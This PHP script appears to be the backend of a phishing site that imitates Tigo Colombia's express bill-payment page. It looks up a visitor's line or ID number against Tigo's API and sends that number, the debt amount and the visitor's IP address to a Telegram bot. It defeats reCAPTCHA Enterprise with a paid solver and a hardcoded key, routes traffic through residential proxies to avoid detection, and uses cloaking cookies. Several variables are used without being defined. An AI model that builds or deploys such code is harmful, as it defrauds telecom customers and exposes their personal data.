<?php
require_once 'security.php';
require_once __DIR__ . '/config/cloak.php';
set_time_limit(150);
ini_set('display_errors', 0);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/php_errors.log');
header('Content-Type: application/json');

$config = require_once 'config.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

$apiKey = "842d558abb1609e49f1bec6d54106c57"; // CapMonster API key
$siteKeyTigo = "6Ldat4QsAAAAABNF7g9awFqFmozAQD8GYKOsFYm1";
$pageUrlTigo = "https://mi.tigo.com.co";

$input = json_decode(file_get_contents('php://input'), true);
$value = $input['value'] ?? '';
$type = $input['type'] ?? 'document';
$recaptchaToken = $input['recaptchaToken'] ?? '';
$manualCaptchaText = $input['manualCaptchaText'] ?? null;
$manualCaptchaToken = $input['manualCaptchaToken'] ?? null;

if (empty($value)) {
    echo json_encode(["success" => false, "message" => "El valor de consulta (número de línea o documento) no puede estar vacío."]);
    exit;
}

// Helper function for Telegram (defined early so mocks can use it)
function sendTelegramMessage($message)
{
    global $botToken, $chatId;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_exec($ch);
    curl_close($ch);
}

// Mocks
if ($value === '3002727129') {
    $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    $clientIP = explode(',', $ipHeader)[0]; // Get first IP only (client)

    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "💰 Saldo: *$ 110.635*\n";
    $telegramMessage .= "📅 Vencimiento: 10/01/2026\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    echo json_encode([
        "success" => true,
        "status" => "debt",
        "balance" => "$ 110.635",
        "dueDate" => "10/01/2026",
        "full_data" => ["mock" => true]
    ]);
    exit;
}
if ($value === '1143144880') {
    $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    $clientIP = explode(',', $ipHeader)[0];

    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "✅ Estado: *Al día*\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    echo json_encode(["success" => true, "status" => "up_to_date", "message" => "¡Estás al día con el pago de las facturas del servicio que ingresaste! 🎉 😄"]);
    exit;
}

function solveCaptcha($apiKey, $siteKey, $pageUrl)
{
    // Tigo usa reCAPTCHA Enterprise (v3 Invisible)
    // Para CapMonster v3 Enterprise:
    $taskData = json_encode([
        'clientKey' => $apiKey,
        'task' => [
            'type' => 'RecaptchaV3EnterpriseTask',
            'websiteURL' => $pageUrl,
            'websiteKey' => '6Ldat4QsAAAAABNF7g9awFqFmozAQD8GYKOsFYm1',
            'minScore' => 0.9,
            'pageAction' => 'submit'
        ]
    ]);

    $ch = curl_init('https://api.capmonster.cloud/createTask');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $taskData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    $response = curl_exec($ch);
    curl_close($ch);

    $result = json_decode($response, true);
    if (!isset($result['taskId']) || ($result['errorId'] ?? 1) !== 0) {
        error_log("[CapMonster] Error creando tarea: " . $response);
        return false;
    }

    $taskId = $result['taskId'];
    error_log("[CapMonster] TaskId: $taskId (Enterprise)");

    // Paso 2: Polling por el resultado
    $maxAttempts = 40; // Aumentamos tiempo para Enterprise
    $attempt = 0;
    while ($attempt < $maxAttempts) {
        sleep(2);

        $ch = curl_init('https://api.capmonster.cloud/getTaskResult');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['clientKey' => $apiKey, 'taskId' => $taskId]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        $res = curl_exec($ch);
        curl_close($ch);

        $r = json_decode($res, true);
        if (($r['errorId'] ?? 1) !== 0) {
            error_log("[CapMonster] Error en poll: " . ($r['errorDescription'] ?? ''));
            return false;
        }
        if (($r['status'] ?? '') === 'ready') {
            return $r['solution']['gRecaptchaResponse'];
        }
        $attempt++;
    }

    error_log("[CapMonster] TIMEOUT");
    return false;
// (El bloque que cerraba una función anterior se respeta si era de otra función)
}

function getTigoBalance($value, $type, $recaptchaToken, $imageCaptchaText = null, $imageCaptchaToken = null)
{
    // Cargar configuración global (incluyendo Proxy)
    $config = require __DIR__ . '/config.php';
    $value = trim((string)$value);
    // Limpiar espacios internos o caracteres raros si es móvil
    if ($type !== 'document') {
        $value = preg_replace('/[^0-9]/', '', $value);
    }

    if ($type === 'document') {
        $url = "https://micuenta2-tigo-com-co-prod.tigocloud.net/api/v2.0/convergent/billing/cc/$value/express/balance?_format=json";
        $payload = [
            "isCampaign" => false,
            "skipFromCampaign" => false,
            "isAuth" => false,
            "searchType" => "documents",
            "token" => $recaptchaToken,
            "documentType" => "cc",
            "email" => "",
            "zrcCode" => ""
        ];
    } else {
        $url = "https://micuenta2-tigo-com-co-prod.tigocloud.net/api/v2.0/mobile/billing/subscribers/$value/express/balance?_format=json";
        $payload = [
            "isCampaign" => false,
            "skipFromCampaign" => false,
            "isAuth" => false,
            "searchType" => "subscribers",
            "token" => $recaptchaToken,
            "documentType" => "subscribers",
            "email" => $value . "@mitigoexpress.com",
            "zrcCode" => ""
        ];
    }

    // --- PASO 1: CAPTURAR COOKIES DE SESIÓN (PRE-VUELO) ---
    $preCh = curl_init("https://mi.tigo.com.co/pago-express/facturas");
    
    // Aplicar Proxy Residencial también aquí (Vital para no ser detectado)
    if (isset($config['proxy_host']) && !empty($config['proxy_host'])) {
        curl_setopt($preCh, CURLOPT_PROXY, "{$config['proxy_host']}:{$config['proxy_port']}");
        curl_setopt($preCh, CURLOPT_PROXYUSERPWD, "{$config['proxy_user']}:{$config['proxy_pass']}");
        curl_setopt($preCh, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($preCh, CURLOPT_SSL_VERIFYPEER, false);
    }

    curl_setopt($preCh, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($preCh, CURLOPT_HEADER, true);
    curl_setopt($preCh, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36');
    curl_setopt($preCh, CURLOPT_TIMEOUT, 15);
    
    $preResponse = curl_exec($preCh);
    
    // Extraer cookies de los headers
    $cookies = [];
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $preResponse, $matches);
    foreach($matches[1] as $item) {
        $cookies[] = $item;
    }
    $cookieString = implode('; ', $cookies);
    curl_close($preCh);

    // --- PASO 2: CONSULTA DE SALDO ---
    $payload = [
        "isCampaign" => false,
        "skipFromCampaign" => false,
        "isAuth" => false,
        "searchType" => $docType, // Dinámico (subscribers o cc)
        "token" => $recaptchaToken,
        "documentType" => $docType, // Dinámico (subscribers o cc)
        "email" => "{$value}@mitigoexpress.com",
        "zrcCode" => $imageCaptchaText ?? ""
    ];

    if ($imageCaptchaText && $imageCaptchaToken) {
        $payload["token"] = $imageCaptchaToken;
        $payload["zrcCode"] = $imageCaptchaText;
    }

    error_log("[Tigo Request] URL: $url | Payload: " . json_encode($payload));


    $ch = curl_init($url);
    
    // Configuración del Proxy Residencial (Bright Data) cargado desde config.php
    if (isset($config['proxy_host']) && !empty($config['proxy_host'])) {
        $p_host = $config['proxy_host'];
        $p_port = $config['proxy_port'];
        $p_user = $config['proxy_user'];
        $p_pass = $config['proxy_pass'];
        
        curl_setopt($ch, CURLOPT_PROXY, "$p_host:$p_port");
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$p_user:$p_pass");
        
        // Evitar fallos de certificado SSL con proxies intermedios
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        error_log("[Proxy] Usando: $p_host:$p_port con usuario $p_user");
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    
    $headers = [
        'accept: application/json, text/plain, */*',
        'accept-language: es-419,es;q=0.9',
        'client-version: 5.20.3',
        'content-type: application/json',
        'notoken: true',
        'origin: https://mi.tigo.com.co',
        'priority: u=1, i',
        'referer: https://mi.tigo.com.co/',
        'sec-ch-ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
    ];
    
    // Añadimos las cookies capturadas si existen
    if (!empty($cookieString)) {
        $headers[] = "Cookie: $cookieString";
    }

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 25);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    return [
        'data' => json_decode((string)$response, true),
        'httpCode' => $httpCode,
        'curlError' => $curlError
    ];
}


$cacheFile = __DIR__ . '/captcha_cache.json';

// Leer token del caché compartido
$token = null;
$cache = @json_decode(@file_get_contents($cacheFile), true);

// --- Lógica de selección de captcha ---
$imageCaptchaText = $manualCaptchaText;
$imageCaptchaToken = $manualCaptchaToken;
$token = $recaptchaToken; 

// Si no hay captcha manual de imagen, y no hay token del frontend...
if (!$imageCaptchaText && !$token) { 
    // Intentar usar el caché de CapMonster (reCAPTCHA v2)
    if (
        isset($cache['token'], $cache['timestamp']) &&
        (time() - $cache['timestamp']) < 100 
    ) {
        $token = $cache['token'];
        file_put_contents($cacheFile, json_encode(['token' => '', 'timestamp' => 0]));
        error_log("[captcha] Usando token de caché ✅");
    }
    else {
        // Resolver en tiempo real como último recurso
        error_log("[captcha] Resolviendo en tiempo real...");
        $token = solveCaptcha($apiKey, $siteKeyTigo, $pageUrlTigo);
    }
}

if (!$token && !$imageCaptchaText) {
    echo json_encode(["success" => false, "message" => "Validación de seguridad pendiente. Por favor intenta de nuevo."]);
    exit;
}

// Realizar la consulta de saldo
$resultPack = getTigoBalance($value, $type, $token, $imageCaptchaText, $imageCaptchaToken);
$data = $resultPack['data'];
$httpCode = $resultPack['httpCode'];
$curlError = $resultPack['curlError'];

$foundItems = [];
if (isset($data['data']['mobile']) && is_array($data['data']['mobile'])) $foundItems = array_merge($foundItems, $data['data']['mobile']);
if (isset($data['data']['convergent']) && is_array($data['data']['convergent'])) $foundItems = array_merge($foundItems, $data['data']['convergent']);
if (isset($data['data']['billingAccounts']) && is_array($data['data']['billingAccounts'])) $foundItems = array_merge($foundItems, $data['data']['billingAccounts']);
if (isset($data['data']['invoices']) && is_array($data['data']['invoices'])) $foundItems = array_merge($foundItems, $data['data']['invoices']);

foreach ($foundItems as $item) {
    // Buscar monto en múltiples campos posibles
    $val = $item['dueAmount']['value'] ?? ($item['balance']['value'] ?? ($item['amount']['value'] ?? ($item['amountRequested']['value'] ?? null)));
    
    if ($val !== null && floatval($val) > 0) {
        $hasDebt = true;
        $amtValue = floatval($val);
        $totalDue += $amtValue;
        
        $realLine = $item['targetMsisdn']['formattedValue'] ?? 
                    ($item['billingAccountId']['formattedValue'] ?? 
                    ($item['susbcriberId'] ?? 
                    ($item['subscriberId'] ?? 
                    ($item['accountId'] ?? $value))));
                    
        $invoices[] = [
            'line' => $realLine,
            'amount' => $item['dueAmount']['formattedValue'] ?? ($item['balance']['formattedValue'] ?? ($item['amount']['formattedValue'] ?? "$ " . number_format($amtValue, 0, ',', '.'))),
            'amountRaw' => $amtValue,
            'dueDate' => $item['dueDate']['formattedValue'] ?? ($item['paymentDate']['formattedValue'] ?? '')
        ];
    }
}

// Fallback to formatted strings parsing if value missing but formatted exists
if (!$hasDebt && isset($data['data']['mobile']) && is_array($data['data']['mobile'])) {
    foreach ($data['data']['mobile'] as $mobile) {
        $formatted = $mobile['dueAmount']['formattedValue'] ?? null;
        if ($formatted) {
            $clean = floatval(preg_replace('/[^0-9]/', '', $formatted));
            if ($clean > 0) {
                $hasDebt = true;
                $totalDue += $clean;
                $realLine = $mobile['targetMsisdn']['formattedValue'] ?? ($mobile['billingAccountId']['formattedValue'] ?? ($mobile['susbcriberId'] ?? ($mobile['subscriberId'] ?? $value)));
                $invoices[] = [
                    'line' => $realLine,
                    'amount' => $formatted,
                    'amountRaw' => $clean,
                    'dueDate' => $mobile['dueDate']['formattedValue'] ?? ''
                ];
            }
        }
    }
}

$ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
$clientIP = explode(',', $ipHeader)[0];

if ($hasDebt && count($invoices) > 0) {
    // Escenarios de deuda
    $formattedTotal = '$ ' . number_format($totalDue, 0, ',', '.');

    // Telegram notification
    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "🧾 Facturas: *" . count($invoices) . "*\n";
    $telegramMessage .= "💰 Deuda Total: *$formattedTotal*\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    file_put_contents(__DIR__ . '/debug_success.json', json_encode($data, JSON_PRETTY_PRINT));
    
    // El captcha fue resuelto y validado por Tigo -> Usuario Humano Confirmado
    cloak_set_cookie('is_human', 'true');

    echo json_encode([
        "success" => true,
        "status" => "debt",
        "invoices" => $invoices,
        "totalBalance" => $formattedTotal,
        "totalBalanceRaw" => $totalDue,
        "full_data" => $data
    ]);
}
elseif (
(isset($data['data']['mobile']) && count($data['data']['mobile']) > 0) ||
(isset($data['data']['convergent']) && count($data['data']['convergent']) > 0) ||
(isset($data['data']['billingAccounts']) && count($data['data']['billingAccounts']) > 0)
) {
    // Existen cuentas pero no tienen deuda > 0 (Al día)
    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "✅ Estado: *Al día*\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    // El usuario está al día (pasó captcha y validó con Tigo) -> Humano Confirmado
    cloak_set_cookie('is_human', 'true');

    echo json_encode(["success" => true, "status" => "up_to_date", "message" => "Oye, estás al día con tus pagos."]);
}
elseif (isset($data['data']['result'])) {
    if ($data['data']['result']['class'] === 'success') {
        // Send to Telegram
        $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
        $clientIP = explode(',', $ipHeader)[0];
        $telegramMessage = "🔍 *Consulta Tigo*\n\n";
        $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
        $telegramMessage .= "🔢 Número: `$value`\n";
        $telegramMessage .= "✅ Estado: *" . strip_tags($data['data']['result']['formattedValue']) . "*\n";
        $telegramMessage .= "🌐 IP: `$clientIP`";
        sendTelegramMessage($telegramMessage);

        echo json_encode(["success" => true, "status" => "up_to_date", "message" => $data['data']['result']['formattedValue']]);
    }
    else {
        echo json_encode(["success" => false, "status" => "not_found", "message" => $data['data']['result']['formattedValue'], "debug_response" => $data]);
    }
}
else {
    file_put_contents('debug_tigo.json', json_encode($data, JSON_PRETTY_PRINT));

    // Check if this is a CAPTCHA error from Tigo
    if (isset($data['data']['result']['formattedValue'])) {
        $errorMsg = $data['data']['result']['formattedValue'];
        echo json_encode(["success" => false, "status" => "not_found", "message" => $errorMsg, "debug_response" => $data]);
    }
    else {
        echo json_encode([
            "success" => false, 
            "status" => "not_found", 
            "message" => "No se encontro saldo", 
            "httpCode" => $httpCode,
            "curl_error" => $curlError ?? null,
            "debug" => $data,
            "raw_response" => substr((string)$response, 0, 500)
        ]);
    }
}
